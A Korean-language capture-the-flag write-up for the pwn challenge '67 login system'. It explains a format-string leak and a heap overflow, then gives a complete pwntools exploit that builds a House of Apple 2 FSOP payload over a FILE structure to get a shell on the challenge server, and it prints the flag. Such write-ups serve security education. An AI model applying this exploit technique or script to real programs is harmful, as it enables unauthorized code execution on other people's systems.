---
ctf_name: "NoHackNoCTF"
challenge_name: "67-login-system"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "aswe0810m"
date: "2026-07-07"
points: 100
tags: [FSOP, FSB]
---

# 67 login system

## 문제 설명

> Can u login me?

- `nc txg.chal2.teagod.tech 16767`
- 바이너리 파일 `chal` 및 Dockerfile 제공

## 풀이

### 분석

stripped된 PIE 바이너리로, 유저 슬롯 4개를 관리하는 로그인 시스템이다.

**보호기법:**
- PIE: 활성화
- NX: 활성화
- Canary: 없음
- RELRO: Partial

**구조체**
```C
struct user {
    char username[0x40];
    FILE *fp;
}

void *slots[4]; //전역 슬롯 배열
```

**힙 레이아웃:**

register 시 `malloc(0x48)` 후 `fopen("/dev/null", "r")`을 호출하므로, 힙에 user chunk(0x50)와 FILE chunk(0x1e0)가 교대로 할당된다.

**주요 함수:**

- **register**: `malloc(0x48)` → `fopen("/dev/null", "r")` → `read(0, chunk, 0x40)`
- **show**: `printf(slots[idx]->username)` → `write(1, slots[idx], 0x48)`
- **login**: `fwrite("login\0", 1, 6, fp)` → `fflush(fp)`
- **update**: `read(0, slots[idx], 0x200)`
- **delete**: `fclose(fp)` → `free(chunk)` → `slots[idx] = NULL`

### 취약점

**1. 포맷 스트링 버그 (show)**

```c
printf(slots[idx]->username);  // 포맷 스트링 인자 없이 사용자 입력 직접 전달
```

username에 `%p`, `%n` 등을 넣으면 스택 값을 읽거나 쓸 수 있다.

**2. 힙 버퍼 오버플로우 (update)**

```c
read(0, slots[idx], 0x200);  // 0x48 크기 구조체에 0x200 쓰기
```

user chunk(0x48)를 넘어 인접한 FILE 구조체(0x1e0)를 덮어쓸 수 있다. user 데이터 시작으로부터 FILE 구조체 데이터까지의 거리는 0x50이므로 0x200 범위 안에 충분히 들어온다.

### 익스플로잇

**전체 흐름:**

1. FSB로 PIE base, libc base, heap 주소 leak
2. update 오버플로우로 인접 FILE 구조체를 FSOP 페이로드로 조작
3. delete → `fclose(조작된 FILE)` → House of Apple 2 체인 → `system("  sh")`

**Step 1: Leak**

register에서 username을 `%15$p.%33$p`로 설정하고 show를 호출한다.

- `%15$p`: 스택에 남아있는 main 함수 주소 → PIE base 계산
- `%33$p`: `__libc_start_main` 내부 리턴 주소 → libc base 계산 (원격 Arch Linux 기준 오프셋 `0x27879`)

show의 `write(1, slots[0], 0x48)` 출력에서 마지막 8바이트(fp)가 FILE 구조체 힙 주소이므로 heap 주소도 획득한다.

**Step 2: FSOP 페이로드 구성 (House of Apple 2)**

glibc 2.24 이후 vtable 검증이 추가되어 가짜 vtable을 직접 사용할 수 없다. 대신 `_wide_data` 내부의 `_wide_vtable`은 검증을 하지 않는 점을 이용한다.

공격 체인:

fclose(fp)
→ _IO_FINISH(fp)
→ vtable(_IO_wfile_jumps+8)에서 __finish 슬롯 읽음 → _IO_wfile_overflow 호출
→ _flags 검사 통과 (NO_WRITES=0, CURRENTLY_PUTTING=0)
→ _wide_data->_IO_write_base == 0 → _IO_wdoallocbuf 호출
→ _wide_data->_IO_buf_base == NULL → _IO_WDOALLOCATE 호출
→ _wide_data->_wide_vtable->__doallocate(fp) = system(fp)
→ fp 시작이 "  sh\0" → system("  sh") → 쉘 획득

0x200바이트 안에 세 개의 구조체를 배치한다:

0x00-0x3F: 가짜 _IO_wide_data (username 영역 재활용)
0x40:      fp = user_data + 0x50 (가짜 FILE 주소)
0x48:      FILE chunk size = 0x1e1 (보존)
0x50-0x128: 가짜 FILE 구조체
0x130-0x19F: 가짜 _wide_vtable

**Step 3: 트리거**

delete로 slot 0을 삭제하면 `fclose(fp)`가 호출되고, 조작된 FILE 구조체를 따라 FSOP 체인이 실행되어 쉘을 획득한다.

```python
from pwn import *
import struct

context.arch = 'amd64'
context.log_level = 'info'

LOCAL = False
if LOCAL:
    p = process('./chal')
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
    LSM_OFF = 0x2a28b
    FSB_LIBC = 31
else:
    p = remote('txg.chal2.teagod.tech', 16767)
    libc = ELF('./libc.so.6', checksec=False)
    LSM_OFF = 0x27879
    FSB_LIBC = 33

MAIN_OFF = 0x1641

# 1. Register + Show → leak
p.sendlineafter(b'>', b'1')
p.sendafter(b'username: ', f'%15$p.%{FSB_LIBC}$p\x00'.encode())

p.sendlineafter(b'>', b'2')
p.sendlineafter(b'slot: ', b'0')
p.recvuntil(b'username: ')

leak_line = p.recvline().strip().decode()
parts = leak_line.split('.')
pie_base = int(parts[0], 16) - MAIN_OFF
libc_base = int(parts[1], 16) - LSM_OFF
log.info(f"PIE base: {hex(pie_base)}")
log.info(f"libc base: {hex(libc_base)}")

raw = p.recvn(0x48)
fp_addr = u64(raw[0x40:0x48])
user_data = fp_addr - 0x50
log.info(f"user_data: {hex(user_data)}")

# 2. Calculate addresses
system_addr = libc_base + libc.symbols['system']
io_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']

fake_file      = user_data + 0x50
fake_wide_data = user_data
lock_addr      = user_data + 0x10
fake_wvtable   = user_data + 0x130

# 3. Build FSOP payload
pay = bytearray(0x200)
FILE = 0x50

struct.pack_into('<Q', pay, 0x40, fake_file)       # fp
struct.pack_into('<Q', pay, 0x48, 0x1e1)            # chunk size

struct.pack_into('<I', pay, FILE + 0x00, 0x68732020) # _flags = "  sh"
struct.pack_into('<i', pay, FILE + 0x70, -1)         # _fileno
struct.pack_into('<Q', pay, FILE + 0x88, lock_addr)  # _lock
struct.pack_into('<Q', pay, FILE + 0xa0, fake_wide_data) # _wide_data
struct.pack_into('<i', pay, FILE + 0xc0, 0)          # _mode
struct.pack_into('<Q', pay, FILE + 0xd8, io_wfile_jumps + 8) # vtable

struct.pack_into('<Q', pay, 0xE0, fake_wvtable)      # _wide_vtable
struct.pack_into('<Q', pay, 0x130 + 0x68, system_addr) # __doallocate

# 4. Update + Delete → trigger FSOP
p.sendlineafter(b'>', b'4')
p.sendlineafter(b'slot: ', b'0')
p.sendafter(b'new username: ', bytes(pay))

p.sendlineafter(b'>', b'5')
p.sendlineafter(b'slot: ', b'0')

log.success("Shell!")
p.interactive()
```

## 플래그

```
NHNC{0x67676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767_sixseven!!!}
```

## 배운 점

- **FSOP (File Stream Oriented Programming)**: FILE 구조체 내부의 vtable과 _wide_data를 조작하여 fclose 호출 시 임의 함수를 실행하는 공격 기법.
- **House of Apple 2**: glibc 2.24 이후 vtable 검증 우회. 메인 vtable은 libc 안의 유효한 테이블(`_IO_wfile_jumps`)을 가리키되, 검증을 받지 않는 `_wide_vtable`에 system 주소를 배치. vtable을 8바이트 밀어서(+8) `__finish` 슬롯이 `_IO_wfile_overflow`를 호출하게 함.
- **_flags 제약**: FSOP에서 `_flags`는 system의 인자(쉘 명령)이면서 동시에 특정 비트 조건(`_IO_NO_WRITES`=0, `_IO_CURRENTLY_PUTTING`=0)을 만족해야 한다. `"  sh"` (0x68732020)가 양쪽 조건을 모두 충족.
- **로컬 vs 원격 오프셋 차이**: FSB에서 libc 리턴 주소의 스택 위치와 오프셋이 Ubuntu와 Arch Linux에서 다르다. Dockerfile에서 동일 이미지의 libc를 추출하여 오프셋을 확인해야 한다.
- **힙 레이아웃 추론**: `malloc` → `fopen` 순서로 호출되면 user chunk 뒤에 FILE chunk가 인접 배치되므로, 오버플로우로 FILE 구조체를 덮을 수 있다. GDB의 `heap` 명령으로 검증 가능.